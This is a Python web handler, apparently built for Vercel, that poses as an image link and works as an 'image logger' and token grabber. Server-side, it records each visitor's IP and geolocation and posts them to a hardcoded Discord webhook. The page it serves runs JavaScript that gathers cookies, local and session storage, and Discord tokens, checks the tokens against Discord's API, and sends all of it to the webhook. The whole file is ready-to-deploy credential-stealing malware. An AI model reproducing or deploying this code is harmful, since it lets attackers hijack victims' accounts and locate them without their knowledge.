from http.server import BaseHTTPRequestHandler
from urllib import parse
import json
import urllib.request

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Your webhook URL
        WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
        
        # Default image
        DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
        
        # Custom image mappings
        IMAGES = {
            "mycatimage": "https://i.imgur.com/5M6F3wQ.jpeg",
            "dogpic": "https://i.imgur.com/2QksCKj.jpeg",
            "meme": "https://i.imgur.com/X8TjKyj.jpeg",
            "poki": "https://i.imgur.com/5M6F3wQ.jpeg",
        }
        
        # Get REAL IP - try multiple headers
        ip = (self.headers.get('CF-Connecting-IP') or 
              self.headers.get('X-Real-IP') or 
              self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or 
              self.client_address[0])
        
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        # Get IP info from multiple sources
        info = {}
        try:
            # Try ipapi.co first - more accurate
            ip_info_url = f"https://ipapi.co/{ip}/json/"
            req = urllib.request.Request(ip_info_url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as response:
                info = json.loads(response.read().decode())
        except:
            try:
                # Fallback to ipwhois.app
                ip_info_url = f"http://ipwhois.app/json/{ip}"
                with urllib.request.urlopen(ip_info_url, timeout=5) as response:
                    data = json.loads(response.read().decode())
                    info = {
                        'city': data.get('city'),
                        'region': data.get('region'),
                        'country': data.get('country'),
                        'latitude': data.get('latitude'),
                        'longitude': data.get('longitude'),
                        'org': data.get('isp'),
                        'timezone': data.get('timezone'),
                    }
            except:
                pass
        
        # Get image name from path
        path_parts = self.path.strip('/').split('/')
        image_name = path_parts[-1] if len(path_parts) > 1 else None
        if image_name and '?' in image_name:
            image_name = image_name.split('?')[0]
        
        image_url = IMAGES.get(image_name, DEFAULT_IMAGE)
        
        # Create Discord embed for IP
        embed = {
            "username": "Image Logger",
            "content": "@everyone",
            "embeds": [{
                "title": "🎯 Image Logger - IP Logged",
                "color": 65280,
                "description": f"""**A User Opened the Image!**

**Endpoint:** `{image_name if image_name else 'default'}`

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('org', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('region', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{info.get('latitude', 'N/A')}, {info.get('longitude', 'N/A')}`
> **Timezone:** `{info.get('timezone', 'Unknown')}`

**User Agent:**
```
{user_agent}
```""",
                "thumbnail": {"url": image_url},
                "footer": {"text": "Vercel Image Logger"}
            }]
        }
        
        # Send to webhook
        try:
            data = json.dumps(embed).encode('utf-8')
            req = urllib.request.Request(WEBHOOK, data=data, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req)
        except:
            pass
        
        # Return HTML with AGGRESSIVE cookie and token grabber
        html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Image">
    <meta property="og:image" content="{image_url}">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="{image_url}">
    <title>Image</title>
    <style>
        body {{ margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #000; }}
        img {{ max-width: 100%; max-height: 100vh; object-fit: contain; }}
        #info {{ position: fixed; top: 10px; left: 10px; background: rgba(0,255,0,0.95); color: #000; padding: 20px; border-radius: 10px; font-family: monospace; font-size: 11px; max-width: 95%; max-height: 90vh; overflow-y: auto; z-index: 99999; }}
    </style>
</head>
<body>
    <img src="{image_url}" alt="Image">
    <div id="info"></div>
    <script>
(async function(){{
    const info = document.getElementById('info');
    let output = '<b>🔍 GRABBING YOUR DATA...</b><br><br>';
    
    // GET ALL COOKIES
    output += '<b>🍪 COOKIES:</b><br>';
    const allCookies = document.cookie;
    if(allCookies){{
        const cookieList = allCookies.split(';').map(c=>c.trim());
        output += cookieList.join('<br>') + '<br><br>';
    }}else{{
        output += 'No cookies found<br><br>';
    }}
    
    // GET LOCALSTORAGE
    output += '<b>💾 LOCALSTORAGE:</b><br>';
    try{{
        for(let i=0; i<localStorage.length; i++){{
            const key = localStorage.key(i);
            const val = localStorage.getItem(key);
            output += key + ': ' + (val.length>100 ? val.substr(0,100)+'...' : val) + '<br>';
        }}
    }}catch(e){{output += 'Cannot access<br>';}}
    output += '<br>';
    
    // GET SESSIONSTORAGE
    output += '<b>💾 SESSIONSTORAGE:</b><br>';
    try{{
        for(let i=0; i<sessionStorage.length; i++){{
            const key = sessionStorage.key(i);
            const val = sessionStorage.getItem(key);
            output += key + ': ' + (val.length>100 ? val.substr(0,100)+'...' : val) + '<br>';
        }}
    }}catch(e){{output += 'Cannot access<br>';}}
    output += '<br>';
    
    // DISCORD TOKEN GRAB
    output += '<b>🔑 DISCORD TOKENS:</b><br>';
    let tokens = [];
    
    try{{
        if(window.webpackChunkdiscord_app){{
            window.webpackChunkdiscord_app.push([[Math.random()],{{}},req=>{{
                for(const m of Object.keys(req.c).map(x=>req.c[x].exports).filter(x=>x)){{
                    if(m.default?.getToken) tokens.push(m.default.getToken());
                    if(m.getToken) tokens.push(m.getToken());
                }}
            }}]);
        }}
    }}catch(e){{}}
    
    // Scan all storage for tokens
    const scanForTokens = (str) => {{
        const matches = str.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/g) || str.match(/mfa\\.[\\w-]{{84}}/g) || [];
        return matches;
    }};
    
    try{{
        for(let i=0; i<localStorage.length; i++){{
            const val = localStorage.getItem(localStorage.key(i));
            const found = scanForTokens(val);
            found.forEach(t=>{{ if(!tokens.includes(t)) tokens.push(t); }});
        }}
    }}catch(e){{}}
    
    if(tokens.length>0){{
        tokens.forEach((t,i)=>{{ output += 'Token '+(i+1)+': '+t+'<br>'; }});
    }}else{{
        output += 'No tokens found (open in Discord app)<br>';
    }}
    
    info.innerHTML = output;
    
    // SEND EVERYTHING TO WEBHOOK
    const dataToSend = {{
        cookies: allCookies,
        localStorage: {{}},
        sessionStorage: {{}},
        tokens: tokens,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenRes: screen.width+'x'+screen.height
    }};
    
    try{{
        for(let i=0; i<localStorage.length; i++){{
            const key = localStorage.key(i);
            dataToSend.localStorage[key] = localStorage.getItem(key);
        }}
    }}catch(e){{}}
    
    try{{
        for(let i=0; i<sessionStorage.length; i++){{
            const key = sessionStorage.key(i);
            dataToSend.sessionStorage[key] = sessionStorage.getItem(key);
        }}
    }}catch(e){{}}
    
    // Send cookies
    if(allCookies){{
        await fetch('{WEBHOOK}',{{
            method:'POST',
            headers:{{'Content-Type':'application/json'}},
            body:JSON.stringify({{
                content:'@everyone',
                embeds:[{{
                    title:'🍪 COOKIES GRABBED',
                    color:16753920,
                    description:'```'+allCookies+'```',
                    fields:[
                        {{name:'Endpoint',value:'{image_name if image_name else "default"}',inline:true}}
                    ]
                }}]
            }})
        }});
    }}
    
    // Send storage data
    const storageData = JSON.stringify(dataToSend, null, 2);
    if(storageData.length > 100){{
        await fetch('{WEBHOOK}',{{
            method:'POST',
            headers:{{'Content-Type':'application/json'}},
            body:JSON.stringify({{
                content:'@everyone',
                embeds:[{{
                    title:'💾 STORAGE DATA',
                    color:3447003,
                    description:'```json\\n'+storageData.substr(0,1900)+'```',
                    fields:[
                        {{name:'Endpoint',value:'{image_name if image_name else "default"}',inline:true}}
                    ]
                }}]
            }})
        }});
    }}
    
    // Send tokens
    for(let t of tokens){{
        try{{
            const r = await fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':t}}}});
            let userInfo = 'Unknown';
            if(r.ok){{
                const d = await r.json();
                userInfo = d.username+'#'+d.discriminator+' ('+d.id+')';
            }}
            await fetch('{WEBHOOK}',{{
                method:'POST',
                headers:{{'Content-Type':'application/json'}},
                body:JSON.stringify({{
                    content:'@everyone',
                    embeds:[{{
                        title:'🔑 TOKEN GRABBED',
                        color:16711680,
                        fields:[
                            {{name:'Token',value:'```'+t+'```',inline:false}},
                            {{name:'Account',value:userInfo,inline:false}},
                            {{name:'Endpoint',value:'{image_name if image_name else "default"}',inline:true}}
                        ]
                    }}]
                }})
            }});
        }}catch(e){{}}
    }}
}})();
    </script>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
        return
